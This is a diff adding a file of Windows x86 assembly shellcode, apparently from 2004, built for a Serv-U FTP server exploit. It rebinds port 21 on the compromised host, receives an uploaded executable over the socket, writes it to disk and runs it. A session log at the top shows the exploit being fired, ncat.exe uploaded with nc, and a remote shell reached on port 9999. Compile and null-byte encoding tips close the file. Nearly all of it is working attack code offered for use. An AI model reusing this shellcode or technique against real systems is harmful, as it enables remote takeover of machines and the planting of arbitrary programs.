@@ -1,0 +1,356 @@
+					One-Way-Uploading-and-Executing Shellcode v0.2
+					    www.delikon.de/Delikon/3.8.04
+
+
+//before
+C:\Codes\serv-u\serv-u1.2\Debug>nc 192.168.0.113 21
+220 Serv-U FTP Server v4.0 for WinSock ready...
+
+
+
+//Exploiting the ftpd, with the one-way-shellcode.
+//and uploading the ncat.exe from http://www.elitehaven.net to port 21
+//this ncat spwans a shell on port 9999
+//You see the ftpd, answers after the exploit with the filename
+//in this case ROOT(.exe), so the attacker can easily determinate 
+//if the exploit was successful
+C:\Codes\serv-u\serv-u1.2\Debug>exploit 192.168.0.113  21
+230 User logged in, proceed.
+
+200 Type set to I.
+
+[+] Connected
+[+] sended
+
+C:\Codes\serv-u\serv-u1.2\Debug>nc 192.168.0.113 21 < ncat.exe
+ROOT^C
+
+
+C:\Codes\serv-u\serv-u1.2\Debug>nc 192.168.0.113 9999
+Microsoft Windows 2000 [Version 5.00.2195]
+(C) Copyright 1985-2000 Microsoft Corp.
+
+C:\>
+
+-------------------------------------------------------------------------------------
+This code uses a very simple way to bind the own socket to port 21.
+It closes every socket!, till the bind() call is successfull.
+This solution is simple, effective, and don't blow up the shellcode
+
+but you can also use getpeername() to catch the right socket 
+(phrack #62)
+
+I like also the idea to hook accept() like vecna does it in 
+http://29a.host.sk/29a-7/Articles/29A-7.014
+but this is not always possible(only if you can overwrite the ret op ,and the server start
+always a new thread for every connection) so i think this is a nice and dirty 
+ways to implement a one way shellcode. 
+-------------------------------------------------------------------------------------
+Many tnx to 
+www.metasploit.com for the code snippets, so i don't need to code too much ;) 
+-------------------------------------------------------------------------------------
+compile it with 
+nasm -fbin -o outputfile inputfile
+and use your favourite encoder to avoid nulls
+-------------------------------------------------------------------------------------
+[BITS 32]
+
+
+
+%define BLOCKSZ 100
+
+
+		jmp 	data
+		
+		
+start:
+		pop 	   ebx
+		push ebp
+		mov ebp,esp
+		sub   sp,60 ;we want save 4*13 bytes for func addr
+		mov esi,esp
+		sub sp,12
+		
+		
+
+		call LK32Base
+		mov edi, eax  ; kernel addr in EDI
+
+		
+		push  dword edi
+		push 0xec0e4e8e
+		call LGetProcAddress
+		mov [ebp+8], eax	; LoadLibrary addr in ebp+8
+		
+		
+		lea edx,[ebx+52]
+		push edx
+		call [ebp+8]
+		mov [ebp+8],eax
+
+		lea edx,[ebx+52+11]    ;get the file name
+		mov [esi+56],edx
+
+
+		push byte 0xe
+		pop ecx
+kerneladdr:
+		cmp cx,12-4
+		jne here
+		mov edi,[ebp+8]
+		
+		
+here:		
+		mov [esi],ecx     ;save the counter
+		push  dword edi
+		push dword [ecx*4+ebx-4]
+		call LGetProcAddress
+		mov ecx,[esi]     ;restore it
+		mov [esi+ecx*4-4],eax
+	loop kerneladdr
+				
+LWSAStartup:
+	; WSAStartup(0x101, DATA) 
+	sub sp, 400
+	push esp
+	push 0x101
+	call [esi + 4]
+
+		xor edi,edi
+
+	
+
+closeall:
+        xor edi,edi
+    
+closeall2:		
+		
+		
+		add edi,1
+		push edi		
+		call [esi+24]
+		cmp eax,0
+		jne closeall2
+		
+		
+
+LWSASocketA:
+	; WSASocketA(2,1,0,0,0,0)
+	xor edi,edi 
+	push edi
+	push edi
+	push edi
+	push edi
+	inc edi
+	push edi
+	inc edi
+	push edi
+	call [esi]
+	mov ebx, eax                ; save socket to ebx
+	    
+    
+LBind:
+	xor edi, edi
+	push edi
+	push edi
+	;push dword 0x611E0002 ; port 7777
+	;push dword 0x0c170002 ; port 5900
+	push dword 0x15000002 ; port 21
+	;push dword  0xbd010002 ; port 445
+	mov eax, esp
+	push byte 0x10        ; length
+	push eax
+	push ebx
+	call [esi + 8]
+	cmp eax,0
+	je LListen     ;on succeful binding start listening 
+
+	push ebx       ; we close the new socket
+	call [esi+24]
+	jmp closeall   ; jump back to the closesocket loop
+	
+
+LListen:
+	push edi
+	push ebx
+	call [esi+12]
+
+LAccept:
+	push edi
+	push esi
+	push ebx
+	call [esi + 16]
+	mov ebx, eax
+
+
+
+	push byte 0
+	push byte 4	
+	push dword [esi+56]
+	push ebx
+	call [esi+28]
+
+	
+
+LCreateFile:
+
+        push byte 0     ; template
+;        push byte 6     ; FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM
+        push byte 1
+        push byte 4     ; OPEN_ALWAYS
+        push byte 0     ; lpSecurityAttributes=null
+	push byte 7     ; FILE_SHARE_DELETE | FILE_SHARE_READ | FILE_SHARE_WRITE;
+	push 0xe0000000 ; GENERIC_EXECUTE | GENERIC_READ | GENERIC_WRITE
+	push dword [esi+56]        ; file name
+	call [esi+40]
+	mov edi, eax     ; Handle in edi
+
+LConfigBuffer:
+
+    sub esp, BLOCKSZ - 200
+    mov ebp,esp
+    
+LReadSocket: ; recv(s, buff, 4096, 0)
+    lea edx, [ebp+100]      ; recv buffer ptr
+    push byte 0x00          ; flags
+    push BLOCKSZ            ; length
+    push edx               ; buffer
+    push dword ebx         ; socket
+    call [esi+20]          ; recv()
+	
+   cmp         eax,0xFFFFFFFF  ; disconnect ?? yes! go end 
+   je          end
+ cmp         eax,0  ; disconnect ?? yes! go end 
+   je          end
+
+LWriteFile: 
+   lea edx, [ebp+100]      ; recv buffer ptr
+    push byte 0             ; not overlapped
+    push ecx                ; &written
+    push eax                ; recv len
+    push edx    ; source buffer
+    push edi                ; file handle
+    call [esi+44]          ; WriteFile
+
+
+    jmp LReadSocket         ; go read some more
+
+end:
+LCloseHandle:
+	    push edi
+	    call [esi+48]
+
+		push        5
+		push        dword [esi+56]
+		call		[esi+36]
+
+	xor edi,edi
+	push edi
+	call [esi+32]		
+
+    
+
+		
+
+	LK32Base:
+		push ebp
+		push esi
+
+		mov eax, [fs:0x30]
+		
+
+		mov eax, [eax + 0x0c] 
+		mov esi, [eax + 0x1c] 
+		lodsd  
+		mov ebp, [eax + 0x08] 
+	
+		mov eax, ebp
+		pop esi
+		pop ebp
+		ret 
+
+
+
+	LGetProcAddress:
+
+		push ebx
+		push ebp
+		push esi
+		push edi
+		
+		mov ebp, [esp + 24]; DLL Base Address */
+		mov eax, [ebp + 0x3c]; eax = PE header offset */
+		mov edx, [ebp + eax + 120]
+		add edx, ebp; edx = exports directory table */
+		mov ecx, [edx + 24]; ecx = number of name pointers */
+		mov ebx, [edx + 32]
+		add ebx, ebp; ebx = name pointers table */
+
+	LFnlp:
+		jecxz LNtfnd
+		dec ecx
+		mov esi, [ebx + ecx * 4]
+		add esi, ebp; esi = name pointer */
+		xor edi, edi
+		cld
+
+	LHshlp:
+		xor eax, eax
+		lodsb
+		cmp al, ah
+		je LFnd
+		ror edi, 13
+		add edi, eax
+		jmp LHshlp
+
+	LFnd:
+		; compare computed hash to argument */
+		cmp edi, [esp + 20]
+		jnz LFnlp
+		mov ebx, [edx + 36]; ebx = ordinals table RNA */
+		add ebx, ebp
+		mov cx, [ebx + 2 * ecx]; ecx = function ordinal */
+		mov ebx, [edx + 28]; ebx = address table RVA */
+		add ebx, ebp
+		mov eax, [ebx + 4 * ecx]; eax = address of function RVA */
+		add eax, ebp
+		jmp LDone
+
+	LNtfnd:
+		xor eax, eax
+
+	LDone:
+		mov edx, ebp
+		
+		pop edi
+		pop esi
+		pop ebp
+		pop ebx		
+		ret     
+
+
+data:	
+
+	call start
+	;addr of kernel
+	dd 0xadf509d9 ;WSASocketA              [esi]
+	dd 0x3bfcedcb ;WSAStartup              	4
+	dd 0xc7701aa4 ;bind				8
+	dd 0xe92eada4 ;listen				12
+	dd 0x498649e5 ;accept				16
+	dd 0xe71819b6 ;recv				20
+	dd 0x79c679e7 ;closesocket            	24
+	dd 0xe97019a4 ;send                       28
+	
+
+
+	dd 0x73e2d87e ;ExitProcess 			32
+	dd 0x0e8afe98  ;WinExec 			36
+
+	dd 0x7c0017a5 ;CreateFileA   		40	
+	dd 0xe80a791f  ;WriteFile        		44
+	dd 0x0ffd97fb   ;CloseHandle			48
+	
+	db "WS2_32.DLL", 0x00
+	db "ROOT.exe", 0x00
+
